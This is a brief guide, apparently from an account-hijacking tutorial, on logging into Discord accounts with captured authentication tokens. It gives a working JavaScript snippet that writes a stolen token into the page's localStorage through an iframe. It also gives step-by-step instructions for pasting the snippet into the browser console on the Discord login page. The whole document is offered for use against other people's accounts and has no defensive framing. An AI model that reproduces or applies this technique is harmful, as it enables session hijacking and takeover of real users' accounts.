Logging into Discord with Tokens

How to use captured Discord tokens to access accounts

Prerequisites

Use the script below to log in with a captured Discord token.

(function() { window.t = "TOKEN HERE"; window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage; window.setInterval(() => window.localStorage.token = `"${window.t}"`); window.location.reload(); })();

Login

  1. Go to discord.com/login
  2. Open the browser console (F12 → Console tab)
  3. Paste the copied script into the console
  4. Replace "TOKEN HERE" with your actual token (keep the quotes)
  5. Press Enter
Success: The page will reload and you should be logged into the account.
